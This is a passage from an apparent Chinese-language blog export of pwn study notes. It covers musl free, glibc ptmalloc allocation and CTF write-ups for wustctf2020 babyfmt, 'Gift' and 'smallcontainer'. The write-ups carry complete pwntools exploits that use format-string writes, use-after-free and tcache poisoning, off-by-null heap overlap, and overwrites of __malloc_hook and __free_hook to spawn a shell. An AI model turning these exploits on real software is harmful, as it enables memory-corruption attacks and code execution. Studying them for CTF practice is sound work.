<li>若 bin 为空，则调用 expand_heap 来获取 chunk， expand_heap 的主要流程为：<ul>
<li>无 brk，则先生成一个新 brk。有则判断是否满足所申请大小，满足则使用 brk</li>
<li>brk 不满足，则会调用 mmap 直接申请一个 chunk。</li>
</ul>
</li>
</ol>
<h2 id="free"><a href="#free" class="headerlink" title="free"></a>free</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">free</span><span class="params">(<span class="keyword">void</span> *p)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="keyword">if</span> (!p) <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">	<span class="class"><span class="keyword">struct</span> <span class="title">chunk</span> *<span class="title">self</span> =</span> MEM_TO_CHUNK(p);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span> (IS_MMAPPED(self))</span><br><span class="line">		unmap_chunk(self);</span><br><span class="line">	<span class="keyword">else</span></span><br><span class="line">		__bin_chunk(self);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>大致流程：</p>
<ol>
<li>检查 chunk 是否存在</li>
<li>检查 chunk 是否是通过 mmap 申请的，即是否是大 chunk</li>
<li>否则调用 __bin_chunk 对 chunk 进行处理<ul>
<li>__bin_chunk 会将 chunk 链入合适的 bin 中。并且，在这链入之前，若该 chunk 的前后有被释放的 chunk，则递归的合并，然后才链入合适的 bin</li>
</ul>
</li>
</ol>
]]></content>
      <tags>
        <tag>笔记</tag>
        <tag>pwn</tag>
        <tag>heap</tag>
      </tags>
  </entry>
  <entry>
    <title>wustctf2020-babyfmt-writeup</title>
    <url>/2022/03/03/wustctf2020-babyfmt-writeup/</url>
    <content><![CDATA[<p>函数就不放了</p>
<span id="more"></span>

<p>除了利用字符串格式化漏洞的操作外，还要了解FILE结构。</p>
<p>在执行程序时，通常会打开三标准文件：stdin(标准输入文件)，stdout(标准输出文件)和stderr(标准输出文件)，且后面两个都对应终端的屏幕。</p>
<p>定义了一个指向FILE结构的指针来接受这个返回值，存放在bss段。解这道题就需要利用这点。</p>
<p>更具体的内容可以看看<a href="https://ctf-wiki.org/pwn/linux/user-mode/io-file/introduction/">CTF wiki</a>。</p>
<h2 id="解题"><a href="#解题" class="headerlink" title="解题"></a>解题</h2><p>这道题有三个功能，leak,fmt_attack,get_flag。</p>
<p>效果就如他们的名字一样，特殊的地方在于，leak和fmt_attack受一个栈上参数限制导致只能执行一次。但由于是在栈上，所以可以通过格式化字符串去改写，于是就能重复使用了。</p>
<p>栈上地址我们可以利用程序开头询问时间的漏洞，输入三个与’%ld’不对应的字符，则不会写入内存，而爆出栈上内容，从而泄露。</p>
<p>get_flag中有一个判断条件，是输入一串字符串与bss段上的secret进行比对。我们可以爆出这个值，但是由于leak只能泄露一位，我们需要重复利用leak，要想重复利用那么就要使用很多次fmt_attack才能将secret全部爆出。因此我们选择使用fmt_attack将secret改为’\0’。除此之外，再get flag之前会关闭stdout。</p>
<p>根据开篇提的知识点，解这道题需要将保存着<code>_IO_2_1_stdout_</code>指针的地址内容改写为<code>_IO_2_1_stderr_</code>。由于这两个指针的内容仅最后两个字节不同，因此我们只需要leak出<code>_IO_2_1_stderr_</code>的倒数第二位即可。</p>
<p>最后调用get_flag就能拿到flag了。</p>
<h2 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>,os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(&#x27;node4.buuoj.cn&#x27;,28477)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./wustctf2020_babyfmt&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_file=elf.libc</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:io.sendlineafter(<span class="string">&quot;&gt;&gt;&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendlineafter(<span class="string">&quot;tell me the time:&quot;</span>,<span class="string">&#x27;a\na\na&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&quot;ok! time is &quot;</span>)</span><br><span class="line">stack_addr=<span class="built_in">int</span>(io.recv(<span class="number">15</span>),<span class="number">10</span>)</span><br><span class="line">io.recvuntil(<span class="string">&#x27;:&#x27;</span>)</span><br><span class="line">elf_base=<span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">10</span>)-<span class="number">0xbd5</span></span><br><span class="line">leak_addr=stack_addr+<span class="number">28</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stack_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(leak_addr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(elf_base)</span><br><span class="line"></span><br><span class="line">secret_addr=elf_base+<span class="number">0x202060</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(secret_addr)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%10$n%11$n&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(secret_addr)</span><br><span class="line">payload+=p64(leak_addr)</span><br><span class="line"><span class="comment"># gdb.attach(io)</span></span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%10$n%11$n&#x27;</span>.ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(secret_addr+<span class="number">4</span>)</span><br><span class="line">payload+=p64(leak_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">stderr=elf_base+<span class="number">0x202040</span></span><br><span class="line">stdout=elf_base+<span class="number">0x202020</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stderr)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(stdout)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line">payload=p64(stderr+<span class="number">1</span>)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">leak=u8(io.recv(<span class="number">1</span>))</span><br><span class="line">val=(leak&lt;&lt;<span class="number">8</span>)+<span class="number">0x40</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(val)</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">payload=<span class="string">&#x27;%&#123;&#125;c%10$hn&#x27;</span>.<span class="built_in">format</span>(val).ljust(<span class="number">0x10</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">payload+=p64(stdout)</span><br><span class="line">gdb.attach(io)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">&#x27;aaa&#x27;</span>)</span><br><span class="line">choose(<span class="number">3</span>)</span><br><span class="line">io.recvuntil(<span class="string">&quot;If you can open the door!&quot;</span>)</span><br><span class="line">io.sendline(<span class="string">&#x27;\0&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title>巅峰极客2022-初赛-pwn</title>
    <url>/2022/08/24/%E5%B7%85%E5%B3%B0%E6%9E%81%E5%AE%A22022-%E5%88%9D%E8%B5%9B-pwn/</url>
    <content><![CDATA[<!-- 难度适中 -->

<span id="more"></span>


<h2 id="Gift"><a href="#Gift" class="headerlink" title="Gift"></a>Gift</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><p>程序的功能：</p>
<ul>
<li>add：申请 chunk，能够申请 0x100 和 0x60 大小</li>
<li>remove：删除 chunk，存在 UAF</li>
<li>check：打印 chunk 内容</li>
<li>bargin：修改 chunk 内容，没有对负数进行约束，能够修改为更大的值</li>
</ul>
<h3 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li><p>利用 UAF 泄漏堆地址</p>
<p> 申请并释放两个 chunk，再打印其中一个包含地址的 chunk 即可。</p>
</li>
<li><p>使用 bargin，输入负数得到类似 double_free 的效果，申请到 tcache_chunk</p>
<p> 我申请的 chunk 都是 0x110，并且是按地址从大到小顺序释放的，同时由于程序生成的 chunk 有两个标识地址，因此 offset 为 -0x120，最后能将 fd 修改为自身地址。由于 chunk 有限，最好修改能第一个被申请的 chunk。</p>
</li>
<li><p>修改 tcache_chunk 中的内容，将 0x110 大小的 tcache 数目设为 7，然后再释放一个该大小的 chunk，再利用 UAF 泄漏 libc</p>
<p> 一开始是想直接填满 tcache 再利用 UAF 来泄漏 libc，但chunk有限，这样最后会差一个 chunk 来申请任意地址。</p>
</li>
<li><p>最后在 tcache_chunk 中写入待修改的地址，申请后实现任意地址修改</p>
<p> 使用 free_hook+system 的话不好写入 binsh 故而使用 malloc_hook+realloc+one_gadget。其中常规 one_gadget 都没用，需要查看所有 one_gadget。</p>
<p> one_gadget 是使用 one_gadget 工具获得的。</p>
</li>
</ol>
<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;182.92.74.66&#x27;</span>,<span class="number">29845</span>)</span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#libc_file=&#x27;./libc.so.6&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">rl=<span class="keyword">lambda</span>:io.recvline()</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;your choice:&quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size,content</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    choose(<span class="built_in">str</span>(size))</span><br><span class="line">    sla(<span class="string">&quot;plz write your wish on your gift!&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bargin</span>(<span class="params">idx,num</span>):</span></span><br><span class="line">    choose(<span class="number">5</span>)</span><br><span class="line">    sla(<span class="string">&quot;index?&quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&quot;How much?&quot;</span>,<span class="built_in">str</span>(num))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    add(<span class="number">1</span>,<span class="string">&#x27;Messa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;cost: &#x27;</span>)</span><br><span class="line">heap=<span class="built_in">int</span>(ru(<span class="string">&#x27;type:&#x27;</span>)[:-<span class="number">5</span>],<span class="number">10</span>)-<span class="number">0x260</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(heap)</span><br><span class="line"></span><br><span class="line">bargin(<span class="number">1</span>,-<span class="number">0x110</span>-<span class="number">0x10</span>)</span><br><span class="line">add(<span class="number">1</span>,p64(heap))<span class="comment">#2</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#3</span></span><br><span class="line">payload=p64(<span class="number">0x0000020000000000</span>)+p64(<span class="number">0x0700000000000000</span>)</span><br><span class="line">payload+=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0x58</span>+p64(heap+<span class="number">0x68</span>)</span><br><span class="line">add(<span class="number">1</span>,payload)<span class="comment">#4</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#5</span></span><br><span class="line">add(<span class="number">1</span>,<span class="string">&#x27;Messa&#x27;</span>)<span class="comment">#6</span></span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">ru(<span class="string">&#x27;cost: &#x27;</span>)</span><br><span class="line">main_arena=<span class="built_in">int</span>(ru(<span class="string">&#x27;type:&#x27;</span>)[:-<span class="number">5</span>],<span class="number">10</span>)</span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebca0</span></span><br><span class="line">libc=elf.libc</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#free_hook=libc_base+libc.sym[&#x27;__free_hook&#x27;]</span></span><br><span class="line">malloc_hook=libc_base+libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="comment">#binsh=libc_base+libc.search(&#x27;/bin/sh&#x27;).next()</span></span><br><span class="line"><span class="comment">#system=libc_base+libc.sym[&#x27;system&#x27;]</span></span><br><span class="line">one_gadget=[<span class="number">0x4f2a5</span>,<span class="number">0x4f302</span>,<span class="number">0x10a2fc</span>,<span class="number">0xe534f</span>,<span class="number">0xe54f7</span>,<span class="number">0xe54fe</span>,<span class="number">0xe5502</span>,<span class="number">0xe553d</span>,<span class="number">0x10a308</span>]</span><br><span class="line">one_gadget_addr=libc_base+one_gadget[<span class="number">5</span>]</span><br><span class="line">realloc=libc_base+libc.sym[<span class="string">&#x27;realloc&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=p64(malloc_hook-<span class="number">0x10</span>-<span class="number">8</span>)</span><br><span class="line">add(<span class="number">2</span>,payload)<span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>,p64(one_gadget_addr)+p64(realloc))</span><br><span class="line"></span><br><span class="line">choose(<span class="number">2</span>)</span><br><span class="line">choose(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(malloc_hook)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<h2 id="smallcontainer"><a href="#smallcontainer" class="headerlink" title="smallcontainer"></a>smallcontainer</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>程序的功能：</p>
<ul>
<li>add：可以申请 0x100 到 0x400 大小的 chunk</li>
<li>delete：可以释放 chunk</li>
<li>edit：修改 chunk 内容，最后返回执行 check,而 check 中存在一个 offbynull 漏洞，需要下一个 chunk_size 的最后一字节为 0x11。</li>
<li>show：打印 chunk 内容</li>
</ul>
<h3 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h3><ol>
<li>由于 add 使用的是 malloc，不会清空 chunk,因此可以从 unsorted_bin 中申请一块 chunk,来泄漏 libc。</li>
<li>edit 中存在 offbynull 漏洞，利用此构造堆重叠，使用 unlink</li>
<li>构造堆重叠后将 free_hook 插入一个 tcache_bin 中，从而申请并修改为 system 来 getshell</li>
</ol>
<h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;amd64&#x27;</span>,terminal=[<span class="string">&#x27;tmux&#x27;</span>,<span class="string">&#x27;split-window&#x27;</span>,<span class="string">&#x27;-h&#x27;</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># s=ssh(host=host,port=port,user=&#x27;CTFMan&#x27;,password=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="comment"># io=s.run(&#x27;/bin/bash&#x27;)</span></span><br><span class="line"></span><br><span class="line">io=process(<span class="string">&#x27;./smallcontainer&#x27;</span>)</span><br><span class="line"><span class="comment"># io=remote(path)</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./smallcontainer&#x27;</span>)</span><br><span class="line"></span><br><span class="line">libc_file=<span class="string">&#x27;./libc-2.27.so&#x27;</span></span><br><span class="line"></span><br><span class="line">s=<span class="keyword">lambda</span> x:io.send(x)</span><br><span class="line">sa=<span class="keyword">lambda</span> x,y:io.sendafter(x,y)</span><br><span class="line">sl=<span class="keyword">lambda</span> x:io.sendline(x)</span><br><span class="line">sla=<span class="keyword">lambda</span> x,y:io.sendlineafter(x,y)</span><br><span class="line">r=<span class="keyword">lambda</span> x:io.recv(x)</span><br><span class="line">rl=<span class="keyword">lambda</span>:io.recvline()</span><br><span class="line">ru=<span class="keyword">lambda</span> x:io.recvuntil(x)</span><br><span class="line">debug=<span class="keyword">lambda</span>:gdb.attach(io)</span><br><span class="line"></span><br><span class="line">choose=<span class="keyword">lambda</span> x:sla(<span class="string">&quot;&gt; &quot;</span>,<span class="built_in">str</span>(x))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">size</span>):</span></span><br><span class="line">    choose(<span class="number">1</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input size: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">2</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">idx,content</span>):</span></span><br><span class="line">    choose(<span class="number">3</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    sl(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">idx</span>):</span></span><br><span class="line">    choose(<span class="number">4</span>)</span><br><span class="line">    sla(<span class="string">&quot;Input index: &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">    add(<span class="number">0x208</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(<span class="number">0x1f0</span>)</span><br><span class="line">add(<span class="number">0x1f0</span>)<span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#7</span></span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">main_arena=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">libc_base=main_arena-<span class="number">0x3ebea0</span></span><br><span class="line">libc=ELF(libc_file)</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(libc_base)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line">free(<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x208</span></span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x200</span>+p64(<span class="number">0x310</span>)</span><br><span class="line">edit(<span class="number">8</span>,payload)</span><br><span class="line">payload=<span class="string">&#x27;a&#x27;</span>*<span class="number">0x1f0</span>+p64(<span class="number">0x200</span>)+p64(<span class="number">0x211</span>)</span><br><span class="line">edit(<span class="number">9</span>,payload)</span><br><span class="line">free(<span class="number">9</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x300</span>)<span class="comment">#0</span></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0xf0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">free_hook=libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;\0&#x27;</span>*<span class="number">0xf0</span></span><br><span class="line">payload+=p64(<span class="number">0</span>)+p64(<span class="number">0x111</span>)</span><br><span class="line">payload+=p64(free_hook)</span><br><span class="line">edit(<span class="number">0</span>,payload)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x100</span>)<span class="comment">#2</span></span><br><span class="line">edit(<span class="number">1</span>,<span class="string">&#x27;/bin/sh\0&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>,p64(system))</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(free_hook)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <tags>
        <tag>pwn</tag>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>堆分配流程_ptmalloc源码分析</title>
    <url>/2022/07/12/%E5%A0%86%E5%88%86%E9%85%8D%E6%B5%81%E7%A8%8B/</url>
    <content><![CDATA[<p>主要以glibc 2.23的源码为例，其他高版本补充。</p>
<span id="more"></span>

<h2 id="获取源码"><a href="#获取源码" class="headerlink" title="获取源码"></a>获取源码</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">git clone https://sourceware.org/git/glibc.git</span><br><span class="line">cd glibc</span><br><span class="line">git checkout release/2.23/master</span><br></pre></td></tr></table></figure>

<h2 id="内存管理过程概述"><a href="#内存管理过程概述" class="headerlink" title="内存管理过程概述"></a>内存管理过程概述</h2><p>ptmalloc分配chunk主要是通过5种不同途径，分别是从几个不同容器中获取内存块top chunk, fastbin, unsorted_bin, small_bin以及large_bin。</p>
<p>申请时，访问这些容器顺序是<code>fastbin-&gt;unsorted_bin-&gt;small_bin-&gt;large_bin-&gt;top chunk</code>；释放时，则是通过chunk的大小对chunk进行分类并放入不同容器。</p>
<ul>
<li>Fast bins 是小内存块的高速缓存，当一些大小小于 64 字节的 chunk被回收时，首先会放入 fast bins 中，在分配小内存时，首先会查看 fast bins 中是否有合适的内存块，如果存在，则直接返回 fast bins 中的内存块，以加快分配速度。</li>
<li>Usorted bin 只有一个，回收的非 fast chunk 首先放到 unsorted bin 中，分配内存时会查看 unsorted bin 中是否有合适的 chunk，如果找到满足条件的 chunk，则直接返回给用户，否则将 unsorted bin 的所有 chunk 放入 small bins 或是 large bins 中。</li>
<li>Small bins 用于存放固定大小的 chunk，共 64 个bin，最小的 chunk 大小为 16 字节或 32 字节，每个 bin 的大小相差 8 字节或是 16 字节，当分配小内存块时，采用精确匹配的方式从 small bins 中查找合适的 chunk。</li>
<li>Large bins 用于存储大于等于 512B 或 1024B 的空闲 chunk，这些 chunk 使用双向链表的形式按大小顺序排序，分配内存时按最近匹配方式从 large bins 中分配 chunk。</li>
<li>Top chunk</li>
</ul>
<h2 id="内存管理过程详述"><a href="#内存管理过程详述" class="headerlink" title="内存管理过程详述"></a>内存管理过程详述</h2><h3 id="malloc"><a href="#malloc" class="headerlink" title="malloc"></a>malloc</h3><p>用户执行malloc时，实际调用的是<code>__libc_malloc</code>，其中又封装了<code>_int_malloc</code>作为主要的执行函数。然后主要是检查几个容器中是否有合适的chunk。</p>
<h4 id="fast-bin"><a href="#fast-bin" class="headerlink" title="fast bin"></a>fast bin</h4><p>在进行了一系列相关检查后，首先会查找 fast bins 中是否有所需大小的 chunk 存在(精确查找)，如果存在，就直接返回。</p>
<p>查找的方式是遍历fd指针，直至找到头结点。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ((<span class="keyword">unsigned</span> <span class="keyword">long</span>)(nb) &lt;= (<span class="keyword">unsigned</span> <span class="keyword">long</span>)(get_max_fast())) &#123;</span><br><span class="line">  idx = fastbin_index(nb);              <span class="comment">// 得到index</span></span><br><span class="line">  mfastbinptr *fb = &amp;fastbin(av, idx);  <span class="comment">// 得到对应fastbin链表的地址</span></span><br><span class="line">  mchunkptr pp = *fb;</span><br><span class="line">  <span class="keyword">do</span> &#123; <span class="comment">// 遍历该fastbin，找到头结点(FIFO)</span></span><br><span class="line">    victim = pp;</span><br><span class="line">    <span class="keyword">if</span> (victim == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125; <span class="keyword">while</span> ((pp = catomic_compare_and_exchange_val_acq(fb, victim-&gt;fd,</span><br><span class="line">                                                      victim)) != victim);</span><br><span class="line">  <span class="keyword">if</span> (victim != <span class="number">0</span>) &#123; <span class="comment">// 检查头结点的**chunk size**</span></span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect(fastbin_index(chunksize(victim)) != idx, <span class="number">0</span>)) &#123;</span><br><span class="line">      errstr = <span class="string">&quot;malloc(): memory corruption (fast)&quot;</span>;</span><br><span class="line">    errout:</span><br><span class="line">      malloc_printerr(check_action, errstr, chunk2mem(victim), av);</span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    check_remalloced_chunk(av, victim, nb);</span><br><span class="line">    <span class="keyword">void</span> *p = chunk2mem(victim); <span class="comment">// 最终得到的内存空间换算为用户空间(mem域)后返回</span></span><br><span class="line">    alloc_perturb(p, bytes); <span class="comment">// 将内容置为perturb_byte^0xff</span></span><br><span class="line">                             <span class="comment">// 默认情况下 perturb_byte 是 0</span></span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><p>若不属于 fast_chunk 范围，则会进入 small_bins 的相关检查与分配。并且在small bin中寻找chunk也是精确查找。</p>
<p>由于small bin共有62个，所以首先要先找到对应的small bin，然后取出一个即可。</p>
<p>由于<code>Chunk_size=2 * SIZE_SZ * index</code>，所以chunksize右移3(4)位得到index(bins[0]不存在，bins[1]为unsorted_bin)。</p>
